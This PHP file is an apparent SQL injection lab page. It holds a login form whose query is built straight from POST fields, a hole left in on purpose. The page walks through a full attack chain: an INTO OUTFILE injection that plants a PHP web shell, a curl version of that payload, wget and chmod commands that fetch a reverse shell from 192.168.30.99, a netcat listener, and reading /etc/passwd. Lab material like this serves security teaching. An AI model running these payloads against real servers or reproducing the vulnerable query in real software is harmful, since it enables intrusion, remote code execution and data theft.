<?php

    require 'functions.php';
    require 'config.php';

    $username = $_POST['username'] ?? null;
    $password = $_POST['password'] ?? null;

    $sql = "SELECT * FROM user WHERE username='$username' AND password=MD5('$password')";

    if ($username) {
        $stmt = $db->prepare($sql);
        $stmt->execute();

        // Rather than process login, we're just going to dump output for this example.
        $result = $stmt->fetch();
    
        if ($result) {
            echo "Welcome, ". $result['first_name'] ." ". $result['last_name'] .".";
            exit;
        } else {
            $flash = 'Incorrect username or password';
        }
    }

?>

<html lang="en">
    <head>
        <title>SQL Injection Example</title>
        <link rel="stylesheet" href="css/style.css" />
        <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
    </head>
    <body>
		<div class="container">
			<h2>Insecure webform</h2>
			<p>
                This is a web form that that doesn't cleanse the variables in the backend. Follow the instructions to gain shell access to the server.</p>
			</p>
        
        <h3>Login Form</h3>
        <form method="POST" action="">

            <?php if ($flash) : ?>
               <div class="flash"><?= $flash ?></div>
            <?php endif ?>

            <dl>
                <dt>Username</dt><dd><input type="text" name="username" value="<?= $_POST['username'] ?? '' ?>" /></dd>
                <dt>Password</dt><dd><input type="text" name="password" value="<?= $_POST['password'] ?? '' ?>" id="password-input" /></dd>
            </dl>
            <input type="submit" name="submit" value="submit" />
        </form>

        <br />

        <div class="code-block">
            <h4>Backend code</h4>
            <p>
                $username = $_POST['username'] ?? null;<br />
                $password = $_POST['password'] ?? null;<br /><br />

                $sql = "SELECT * FROM user WHERE username='$username' AND password=MD5('$password')";
            </p>
        </div>
			
        <div class="steps">
            <h2>Step 1</h2>
            <h4>Create malicious file on the host</h4>
            <p>Use the <em>into outfile</em> MySQL command to create a PHP script on the server that will run our commands.</p>
            <p>Password: <em class="input">mypass');SELECT "&lt;?php system($_GET['cmd']);" INTO OUTFILE "/var/www/web/images/system.php";'</em></p>
            <p><strong>Note:</strong> We need to use cURL here as the opening PHP tag causes issues in the browser.</p>
            <p><em class="input">curl -X POST "http://192.168.30.99/login.php" --data "username=damien&amp;password=mypass');SELECT \"&lt;?php system($_GET['cmd'])\" INTO OUTFILE \"/var/www/web/images/system.php\";'"</em></p>
            <div class="code-block">
                <h4>Resulting SQL</h4>
                <p>
                SELECT * FROM user WHERE username='damien' AND password=MD5('mypass');select "&lt;?php system(['cmd'])" INTO OUTFILE "/var/www/web/images/system.php";'')
                </p>
            </div>
		</div>	

        <div class="steps">
            <h2>Step 2</h2>
		    <h4> Use the newly created script to download a reverse shell</h4>
		    <p><a href="http://<?= HOST ?>/images/system.php?cmd=wget%20http://192.168.30.99/scripts/reverse-shell.py%20-O%20/tmp/reverse-shell.py" target="_blank">http://<?= HOST ?>/images/system.php?cmd=wget http://192.168.30.99/scripts/reverse-shell.py -O /tmp/reverse-shell.py</a>
            </p>
        </div>
			
        <div class="steps">
            <h2>Step 3</h2>
			<h4>Change the permissions on the reverse shell to make it executable</h4>
			<p>
			    <a href="http://<?= HOST ?>/images/system.php?cmd=chmod%20777%20/tmp/reverse-shell.py">http://<?= HOST ?>/images/system.php?cmd=chmod 777  /tmp/reverse-shell.py</a>
			</p>
        </div>

        <div class="steps">
            <h2>Step 4</h2>
			<h4>Open a waiting network service on your host machine</h4>
            <p>Open the network service on port 4444 using <a href="http://netcat.sourceforge.net/" target="_blank">netcat</a>.</p>
            <div class="code-block">
                <h4>Command to run</h4>
                <p>
                    nc -nlvp 4444
                </p>
            </div>
        </div>
			
        <div class="steps">
            <h2>Step 5</h2>
			<h4>Run the downloaded reverse shell</h4>
			<p>
			    <a href="http://<?= HOST ?>/images/system.php?cmd=python%20/tmp/reverse-shell.py">http://<?= HOST ?>/images/system.php?cmd=python /tmp/reverse-shell.py</a>
			</p>
        </div>

        <div class="steps">
            <h2>Completed</h2>
            <h4>You should now be connected</h4>
            <p>
                The netcat command ran from the host machine should now be connected to the reverse shell. Try running commands such as `whoami` and `cat /etc/passwd`.
            </p>
        </div>
    </div>

    <script>
        window.onload = function() {
          $('em.input').click(function() {
            str = $(this).html();
            $('#password-input').val(str);
          });
        }
    </script>

    </body>
</html>
